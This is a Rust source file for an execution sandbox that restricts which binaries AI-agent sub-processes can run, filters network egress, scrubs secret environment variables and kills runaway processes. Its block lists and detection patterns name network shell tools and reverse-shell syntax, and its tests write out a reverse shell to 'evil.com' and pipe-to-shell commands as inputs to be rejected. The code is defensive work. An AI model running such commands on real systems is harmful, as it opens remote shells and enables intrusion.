//! # laminae-ironclad — Process-Level Execution Sandbox
//!
//! Three hard constraints enforced on ALL spawned sub-processes:
//!
//! 1. **Command Whitelist**: Only approved binaries can execute. Network utilities,
//!    crypto miners, compilers, and package managers are permanently blocked.
//!
//! 2. **Network Egress Filter**: Processes run inside a platform-specific sandbox
//!    that restricts network access to localhost and whitelisted API hosts only.
//!    - **macOS**: Seatbelt (`sandbox-exec`) profile.
//!    - **Linux**: Kernel namespaces, `prctl(PR_SET_NO_NEW_PRIVS)`, and `rlimit`.
//!    - **Other**: Environment scrubbing only (no OS-level sandbox).
//!
//! 3. **Resource Watchdog**: Background monitor polls CPU/memory of child processes
//!    and sends SIGKILL if thresholds are exceeded for a sustained period.
//!
//! ## Quick Start
//!
//! ```rust,no_run
//! use laminae_ironclad::{validate_binary, sandboxed_command, spawn_watchdog, WatchdogConfig};
//!
//! #[tokio::main]
//! async fn main() -> anyhow::Result<()> {
//!     // Validate before execution
//!     validate_binary("git")?;  // OK
//!     // validate_binary("ssh")?;  // BLOCKED
//!
//!     // Run inside platform-specific sandbox
//!     let mut cmd = sandboxed_command("git", &["status"], "/path/to/project")?;
//!     let child = cmd.spawn()?;
//!
//!     // Monitor resource usage
//!     let cancel = spawn_watchdog(child.id().unwrap(), WatchdogConfig::default(), "my-agent".into());
//!
//!     // ... wait for child ...
//!     cancel.store(true, std::sync::atomic::Ordering::Relaxed); // stop watchdog
//!     Ok(())
//! }
//! ```

use std::process::Stdio;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use anyhow::{bail, Result};
use tokio::process::Command;

use laminae_glassbox::{log_glassbox_event, Severity};

pub mod sandbox;
pub use sandbox::{default_provider, NetworkPolicy, NoopProvider, SandboxProfile, SandboxProvider};

#[cfg(target_os = "macos")]
pub use sandbox::SeatbeltProvider;

#[cfg(target_os = "linux")]
pub use sandbox::LinuxSandboxProvider;

#[cfg(target_os = "windows")]
pub use sandbox::WindowsSandboxProvider;

// ══════════════════════════════════════════════════════════
// 1. COMMAND WHITELIST — Execution Denial
// ══════════════════════════════════════════════════════════

/// Binaries that are NEVER allowed to execute under any circumstances.
const PERMANENTLY_BLOCKED_BINARIES: &[&str] = &[
    // Network exploitation
    "ssh",
    "sshd",
    "sftp",
    "scp",
    "nc",
    "ncat",
    "nmap",
    "netcat",
    "telnet",
    "socat",
    "stunnel",
    "ngrok",
    "cloudflared",
    // Crypto mining
    "xmrig",
    "minerd",
    "cpuminer",
    "cgminer",
    "bfgminer",
    "ethminer",
    "nbminer",
    "t-rex",
    "gminer",
    "lolminer",
    "nicehash",
    "phoenix",
    "claymore",
    // Compilers/runtimes
    "rustup",
    "rustc",
    "gcc",
    "g++",
    "cc",
    "clang",
    "clang++",
    "make",
    "cmake",
    "ninja",
    // Package managers
    "pip",
    "pip3",
    "pipx",
    "npm",
    "npx",
    "yarn",
    "pnpm",
    "brew",
    "apt",
    "apt-get",
    "yum",
    "dnf",
    "cargo",
    // Dangerous system utilities
    "kill",
    "killall",
    "pkill",
    "chmod",
    "chown",
    "chgrp",
    "mount",
    "umount",
    "iptables",
    "pfctl",
    "dscl",
    "dseditgroup",
    "launchctl",
    "crontab",
    // Download tools
    "curl",
    "wget",
    "fetch",
    "aria2c",
    // Container/VM escape
    "docker",
    "podman",
    "kubectl",
    "vagrant",
    // Process manipulation
    "renice",
    "ionice",
    "nice",
    "taskpolicy",
];

/// Binaries allowed in autonomous/sandboxed mode.
///
/// Override this by providing a custom allowlist via [`IroncladConfig`].
const DEFAULT_ALLOWLIST: &[&str] = &[
    "ls", "cat", "head", "tail", "wc", "sort", "uniq", "find", "which", "echo", "date", "whoami",
    "hostname", "uname", "pwd", "env", "printenv", "diff", "patch", "sed", "awk", "cut", "tr",
    "xargs", "df", "du", "ps", "top", "git", "mkdir", "cp", "mv", "touch", "tar", "gzip", "gunzip",
    "zip", "unzip", "open", "pbcopy", "pbpaste", "say", "claude",
];

/// Configuration for Ironclad's command validation.
#[derive(Debug, Clone)]
pub struct IroncladConfig {
    /// Additional binaries to permanently block (appended to defaults).
    pub extra_blocked: Vec<String>,
    /// Custom allowlist. If empty, uses [`DEFAULT_ALLOWLIST`].
    pub allowlist: Vec<String>,
    /// Additional network hosts that sandboxed processes may connect to.
    pub whitelisted_hosts: Vec<String>,
    /// Environment variables to scrub from child processes.
    pub scrub_env_vars: Vec<String>,
}

impl Default for IroncladConfig {
    fn default() -> Self {
        Self {
            extra_blocked: Vec::new(),
            allowlist: DEFAULT_ALLOWLIST.iter().map(|s| s.to_string()).collect(),
            whitelisted_hosts: vec![
                "127.0.0.1".to_string(),
                "localhost".to_string(),
                "api.anthropic.com".to_string(),
                "api.github.com".to_string(),
            ],
            scrub_env_vars: vec![
                "AWS_SECRET_ACCESS_KEY".to_string(),
                "AWS_SESSION_TOKEN".to_string(),
                "AWS_ACCESS_KEY_ID".to_string(),
                "GITHUB_TOKEN".to_string(),
                "GH_TOKEN".to_string(),
                "OPENAI_API_KEY".to_string(),
                "ANTHROPIC_API_KEY".to_string(),
                "CLAUDE_API_KEY".to_string(),
                "STRIPE_SECRET_KEY".to_string(),
                "DATABASE_URL".to_string(),
                "PRIVATE_KEY".to_string(),
                "SECRET_KEY".to_string(),
                "ENCRYPTION_KEY".to_string(),
            ],
        }
    }
}

/// Validate that a binary is safe to execute.
pub fn validate_binary(binary: &str) -> Result<()> {
    validate_binary_with_config(binary, &IroncladConfig::default())
}

/// Validate with a custom configuration.
pub fn validate_binary_with_config(binary: &str, config: &IroncladConfig) -> Result<()> {
    let bare = binary.rsplit('/').next().unwrap_or(binary);

    if PERMANENTLY_BLOCKED_BINARIES.contains(&bare)
        || config.extra_blocked.iter().any(|b| b == bare)
    {
        log_glassbox_event(
            Severity::Alert,
            "ironclad_blocked_binary",
            &format!("CRITICAL: Attempted execution of blocked binary: {bare}"),
        );
        bail!("IRONCLAD BLOCK: Binary '{bare}' is permanently blocked.");
    }

    if !config.allowlist.iter().any(|a| a == bare) {
        log_glassbox_event(
            Severity::Block,
            "ironclad_unlisted_binary",
            &format!("Blocked unlisted binary: {bare}"),
        );
        bail!("IRONCLAD BLOCK: Binary '{bare}' is not on the allowlist.");
    }

    Ok(())
}

/// Validate an entire command string (catches piped commands, subshells, etc.)
pub fn validate_command_deep(command: &str) -> Result<()> {
    validate_command_deep_with_config(command, &IroncladConfig::default())
}

/// Deep command validation with custom configuration.
pub fn validate_command_deep_with_config(command: &str, config: &IroncladConfig) -> Result<()> {
    let lower = command.to_lowercase();

    let tokens = extract_all_binaries(&lower);
    for token in &tokens {
        let bare = token.rsplit('/').next().unwrap_or(token);
        if PERMANENTLY_BLOCKED_BINARIES.contains(&bare)
            || config.extra_blocked.iter().any(|b| b == bare)
        {
            log_glassbox_event(
                Severity::Alert,
                "ironclad_blocked_in_pipe",
                &format!(
                    "Blocked binary '{bare}' in command chain: {}",
                    truncate(command, 120)
                ),
            );
            bail!("IRONCLAD BLOCK: Command contains blocked binary '{bare}' in pipe/chain.");
        }
    }

    let dangerous_patterns = [
        "/dev/tcp/",
        "/dev/udp/",
        "bash -i >& /dev/",
        "python -c 'import socket",
        "python3 -c 'import socket",
        "perl -e 'use Socket",
        "ruby -rsocket",
        "| sh",
        "| bash",
        "| zsh",
        "| python",
        "| python3",
        "| perl",
        "| ruby",
        "/dev/nvidia",
        "cuda",
        "opencl",
        "metal",
        "hashrate",
        "mining",
        "stratum",
        "nohup ",
        "disown",
        "setsid",
        "screen -d",
        "tmux new -d",
    ];

    for pattern in &dangerous_patterns {
        if lower.contains(pattern) {
            log_glassbox_event(
                Severity::Alert,
                "ironclad_dangerous_pattern",
                &format!(
                    "Blocked dangerous pattern '{pattern}' in command: {}",
                    truncate(command, 120)
                ),
            );
            bail!("IRONCLAD BLOCK: Command matches dangerous pattern: {pattern}");
        }
    }

    Ok(())
}

/// Extract all binary names from a command string, following pipes, chains, subshells.
fn extract_all_binaries(command: &str) -> Vec<String> {
    let mut binaries = Vec::new();

    let segments: Vec<&str> = command
        .split(['|', ';'])
        .flat_map(|seg| seg.split("&&"))
        .flat_map(|seg| seg.split("||"))
        .collect();

    for segment in segments {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }

        let clean = trimmed
            .trim_start_matches('(')
            .trim_start_matches("$(")
            .trim_start_matches('`')
            .trim();

        let mut parts = clean.split_whitespace();
        for part in &mut parts {
            if !part.contains('=') {
                let binary = part.rsplit('/').next().unwrap_or(part);
                binaries.push(binary.to_string());
                break;
            }
        }
    }

    binaries
}

// ══════════════════════════════════════════════════════════
// 2. SANDBOXED COMMAND — Platform-Abstracted
// ══════════════════════════════════════════════════════════

/// Wrap a command in the platform-specific sandbox.
///
/// On macOS this uses `sandbox-exec` (Seatbelt). On Linux it applies kernel
/// namespaces and resource limits via `pre_exec`. On other platforms a no-op
/// provider scrubs environment variables only.
pub fn sandboxed_command(binary: &str, args: &[&str], project_dir: &str) -> Result<Command> {
    sandboxed_command_with_config(binary, args, project_dir, &IroncladConfig::default())
}

/// Sandboxed command with custom configuration.
pub fn sandboxed_command_with_config(
    binary: &str,
    args: &[&str],
    project_dir: &str,
    config: &IroncladConfig,
) -> Result<Command> {
    let bare = binary.rsplit('/').next().unwrap_or(binary);
    validate_binary_with_config(bare, config)?;

    let profile = SandboxProfile::from_config(project_dir, config);
    default_provider().sandboxed_command(binary, args, &profile)
}

// ══════════════════════════════════════════════════════════
// 3. RESOURCE WATCHDOG — CPU/Memory Monitor with SIGKILL
// ══════════════════════════════════════════════════════════

/// Configuration for the resource watchdog.
#[derive(Debug, Clone)]
pub struct WatchdogConfig {
    /// CPU usage threshold (percentage, 0-100). Default: 90%
    pub cpu_threshold: f32,
    /// Memory threshold in MB. Default: 4096 MB (4 GB)
    pub memory_threshold_mb: u64,
    /// How long the threshold must be exceeded before SIGKILL. Default: 5 minutes.
    pub sustained_duration: Duration,
    /// How often to poll process stats. Default: 10 seconds.
    pub poll_interval: Duration,
    /// Maximum wall-clock time for the entire process. Default: 30 minutes.
    pub max_wall_time: Duration,
}

impl Default for WatchdogConfig {
    fn default() -> Self {
        Self {
            cpu_threshold: 90.0,
            memory_threshold_mb: 4096,
            sustained_duration: Duration::from_secs(300),
            poll_interval: Duration::from_secs(10),
            max_wall_time: Duration::from_secs(1800),
        }
    }
}

/// Reason why the watchdog killed a process.
#[derive(Debug, Clone)]
pub enum WatchdogKillReason {
    CpuThresholdExceeded { avg_cpu: f32, duration_secs: u64 },
    MemoryThresholdExceeded { memory_mb: u64 },
    WallTimeExceeded { elapsed_secs: u64 },
    Cancelled,
}

impl std::fmt::Display for WatchdogKillReason {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            WatchdogKillReason::CpuThresholdExceeded {
                avg_cpu,
                duration_secs,
            } => {
                write!(
                    f,
                    "CPU {avg_cpu:.1}% for {duration_secs}s (exceeded threshold)"
                )
            }
            WatchdogKillReason::MemoryThresholdExceeded { memory_mb } => {
                write!(f, "Memory {memory_mb}MB exceeded threshold")
            }
            WatchdogKillReason::WallTimeExceeded { elapsed_secs } => {
                write!(f, "Wall time {elapsed_secs}s exceeded maximum")
            }
            WatchdogKillReason::Cancelled => write!(f, "Manually cancelled"),
        }
    }
}

/// Spawn a background watchdog that monitors a child process by PID.
///
/// Returns a cancellation handle — set to `true` to stop monitoring.
/// If thresholds are exceeded, the process tree is SIGKILL'd.
pub fn spawn_watchdog(pid: u32, config: WatchdogConfig, agent_label: String) -> Arc<AtomicBool> {
    let cancel = Arc::new(AtomicBool::new(false));
    let cancel_clone = cancel.clone();

    tokio::spawn(async move {
        let start = Instant::now();
        let mut cpu_violation_start: Option<Instant> = None;

        loop {
            if cancel_clone.load(Ordering::Relaxed) {
                tracing::debug!("[WATCHDOG] Cancelled for agent {agent_label}");
                break;
            }

            let elapsed = start.elapsed();
            if elapsed > config.max_wall_time {
                let reason = WatchdogKillReason::WallTimeExceeded {
                    elapsed_secs: elapsed.as_secs(),
                };
                kill_process_tree(pid, &agent_label, &reason);
                break;
            }

            match get_process_stats(pid).await {
                Some(stats) => {
                    if stats.memory_mb > config.memory_threshold_mb {
                        let reason = WatchdogKillReason::MemoryThresholdExceeded {
                            memory_mb: stats.memory_mb,
                        };
                        kill_process_tree(pid, &agent_label, &reason);
                        break;
                    }

                    if stats.cpu_percent > config.cpu_threshold {
                        let violation_start = cpu_violation_start.get_or_insert(Instant::now());
                        let violation_duration = violation_start.elapsed();

                        if violation_duration >= config.sustained_duration {
                            let reason = WatchdogKillReason::CpuThresholdExceeded {
                                avg_cpu: stats.cpu_percent,
                                duration_secs: violation_duration.as_secs(),
                            };
                            kill_process_tree(pid, &agent_label, &reason);
                            break;
                        }
                    } else {
                        cpu_violation_start = None;
                    }
                }
                None => {
                    tracing::debug!("[WATCHDOG] Process {pid} no longer exists, stopping");
                    break;
                }
            }

            tokio::time::sleep(config.poll_interval).await;
        }
    });

    cancel
}

struct ProcessStats {
    cpu_percent: f32,
    memory_mb: u64,
}

async fn get_process_stats(pid: u32) -> Option<ProcessStats> {
    #[cfg(unix)]
    {
        let output = tokio::process::Command::new("ps")
            .args(["-o", "%cpu=,rss=", "-p", &pid.to_string()])
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .output()
            .await
            .ok()?;

        if !output.status.success() {
            return None;
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        let trimmed = stdout.trim();
        if trimmed.is_empty() {
            return None;
        }

        let parts: Vec<&str> = trimmed.split_whitespace().collect();
        if parts.len() < 2 {
            return None;
        }

        let cpu_percent: f32 = parts[0].parse().unwrap_or(0.0);
        let rss_kb: u64 = parts[1].parse().unwrap_or(0);

        Some(ProcessStats {
            cpu_percent,
            memory_mb: rss_kb / 1024,
        })
    }

    #[cfg(windows)]
    {
        // Use WMIC to get process CPU and memory stats
        let output = tokio::process::Command::new("wmic")
            .args([
                "process",
                "where",
                &format!("ProcessId={pid}"),
                "get",
                "WorkingSetSize,PercentProcessorTime",
                "/format:csv",
            ])
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .output()
            .await
            .ok()?;

        if !output.status.success() {
            return None;
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        // WMIC CSV output: Node,PercentProcessorTime,WorkingSetSize
        for line in stdout.lines().skip(1) {
            let parts: Vec<&str> = line.split(',').collect();
            if parts.len() >= 3 {
                let cpu_percent: f32 = parts[1].trim().parse().unwrap_or(0.0);
                let working_set_bytes: u64 = parts[2].trim().parse().unwrap_or(0);
                return Some(ProcessStats {
                    cpu_percent,
                    memory_mb: working_set_bytes / (1024 * 1024),
                });
            }
        }
        None
    }

    #[cfg(not(any(unix, windows)))]
    {
        let _ = pid;
        None
    }
}

fn kill_process_tree(pid: u32, agent_label: &str, reason: &WatchdogKillReason) {
    log_glassbox_event(
        Severity::Alert,
        "ironclad_watchdog_kill",
        &format!("WATCHDOG KILL: Agent '{agent_label}' (PID {pid}) terminated. Reason: {reason}"),
    );

    tracing::error!(
        "[IRONCLAD WATCHDOG] Killing process tree for agent '{agent_label}' (PID {pid}): {reason}"
    );

    #[cfg(unix)]
    unsafe {
        libc::kill(-(pid as i32), libc::SIGKILL);
        libc::kill(pid as i32, libc::SIGKILL);
    }

    #[cfg(windows)]
    {
        // taskkill /F /T kills the process tree forcefully
        let _ = std::process::Command::new("taskkill")
            .args(["/F", "/T", "/PID", &pid.to_string()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }

    #[cfg(not(any(unix, windows)))]
    {
        let _ = (pid, agent_label, reason);
        tracing::warn!("Cannot kill process on this platform");
    }
}

fn truncate(s: &str, max: usize) -> &str {
    if s.len() <= max {
        s
    } else {
        let mut end = max;
        while end > 0 && !s.is_char_boundary(end) {
            end -= 1;
        }
        &s[..end]
    }
}

// ══════════════════════════════════════════════════════════
// Tests
// ══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blocks_ssh() {
        assert!(validate_binary("ssh").is_err());
        assert!(validate_binary("/usr/bin/ssh").is_err());
    }

    #[test]
    fn test_blocks_netcat() {
        assert!(validate_binary("nc").is_err());
        assert!(validate_binary("ncat").is_err());
    }

    #[test]
    fn test_blocks_curl_wget() {
        assert!(validate_binary("curl").is_err());
        assert!(validate_binary("wget").is_err());
    }

    #[test]
    fn test_blocks_crypto_miners() {
        assert!(validate_binary("xmrig").is_err());
        assert!(validate_binary("cpuminer").is_err());
    }

    #[test]
    fn test_blocks_compilers() {
        assert!(validate_binary("gcc").is_err());
        assert!(validate_binary("rustc").is_err());
    }

    #[test]
    fn test_blocks_package_managers() {
        assert!(validate_binary("npm").is_err());
        assert!(validate_binary("pip").is_err());
        assert!(validate_binary("cargo").is_err());
    }

    #[test]
    fn test_allows_safe_binaries() {
        assert!(validate_binary("ls").is_ok());
        assert!(validate_binary("cat").is_ok());
        assert!(validate_binary("git").is_ok());
        assert!(validate_binary("echo").is_ok());
        assert!(validate_binary("claude").is_ok());
    }

    #[test]
    fn test_deep_blocks_piped_ssh() {
        assert!(validate_command_deep("echo test | ssh user@evil.com").is_err());
    }

    #[test]
    fn test_deep_blocks_reverse_shell() {
        assert!(validate_command_deep("bash -i >& /dev/tcp/evil.com/4444 0>&1").is_err());
    }

    #[test]
    fn test_deep_blocks_download_and_exec() {
        assert!(validate_command_deep("echo payload | sh").is_err());
        assert!(validate_command_deep("echo payload | bash").is_err());
    }

    #[test]
    fn test_deep_allows_safe_commands() {
        assert!(validate_command_deep("ls -la /tmp").is_ok());
        assert!(validate_command_deep("git status && echo done").is_ok());
        assert!(validate_command_deep("cat file.txt | sort | uniq").is_ok());
    }

    #[test]
    fn test_sandboxed_command_blocks_ssh() {
        assert!(sandboxed_command("ssh", &["user@evil.com"], "/tmp/project").is_err());
    }

    #[test]
    fn test_sandboxed_command_allows_git() {
        assert!(sandboxed_command("git", &["status"], "/tmp/project").is_ok());
    }

    #[test]
    fn test_watchdog_config_defaults() {
        let config = WatchdogConfig::default();
        assert_eq!(config.cpu_threshold, 90.0);
        assert_eq!(config.memory_threshold_mb, 4096);
        assert_eq!(config.max_wall_time, Duration::from_secs(1800));
    }

    #[test]
    fn test_custom_config_extra_blocked() {
        let config = IroncladConfig {
            extra_blocked: vec!["my_evil_tool".to_string()],
            ..Default::default()
        };
        assert!(validate_binary_with_config("my_evil_tool", &config).is_err());
        assert!(validate_binary_with_config("ls", &config).is_ok());
    }

    #[test]
    fn test_extract_binaries_from_pipe() {
        let bins = extract_all_binaries("ls | grep foo | sort");
        assert_eq!(bins, vec!["ls", "grep", "sort"]);
    }

    #[test]
    fn test_extract_binaries_from_chain() {
        let bins = extract_all_binaries("echo test && git commit -m 'fix'");
        assert_eq!(bins, vec!["echo", "git"]);
    }

    #[test]
    fn test_default_provider_available() {
        let provider = default_provider();
        assert!(provider.is_available());
    }

    #[test]
    fn test_default_provider_name() {
        let provider = default_provider();
        #[cfg(target_os = "macos")]
        assert_eq!(provider.name(), "seatbelt");
        #[cfg(target_os = "linux")]
        assert_eq!(provider.name(), "linux-ns");
        #[cfg(target_os = "windows")]
        assert_eq!(provider.name(), "windows-job");
        #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
        assert_eq!(provider.name(), "noop");
    }

    #[test]
    fn test_sandbox_profile_from_config() {
        let config = IroncladConfig::default();
        let profile = SandboxProfile::from_config("/my/project", &config);
        assert_eq!(profile.project_dir, "/my/project");
        assert_eq!(profile.network_policy, NetworkPolicy::Restricted);
        assert!(!profile.scrub_env_vars.is_empty());
        assert!(profile.whitelisted_hosts.contains(&"localhost".to_string()));
    }
}
